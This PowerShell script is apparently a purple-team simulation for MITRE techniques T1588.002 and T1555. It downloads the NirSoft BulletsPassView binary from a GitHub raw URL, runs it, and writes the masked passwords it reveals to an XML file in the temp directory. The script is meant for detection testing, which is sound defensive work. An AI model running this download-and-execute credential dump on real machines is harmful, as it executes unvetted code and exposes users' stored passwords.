<#
    T1588.002 - Obtain Capabilities: Tool
    T1555 - Credentials from Password Stores
    Extract Bullet passwords from softwares with Nirsoft tool BulletsPassView
    Download BulletsPassView.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/BulletsPassView.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

if([System.IntPtr]::Size -eq 4){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/BulletsPassView.exe"
}
elseif([System.IntPtr]::Size -eq 8){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/BulletsPassView_x64.exe"
}
else{
    Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, downloading x32 version of BulletsPassView.exe ..."
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/BulletsPassView.exe"
}

$dumpfile = "$env:tmp\bulletspasswords.xml"
$outfile = "$env:tmp\bulletspwd.exe"

# Download and execute BulletsPassView
try {
    Invoke-WebRequest $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: BulletsPassView.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download BulletsPassView.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Bullets passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Bullets passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
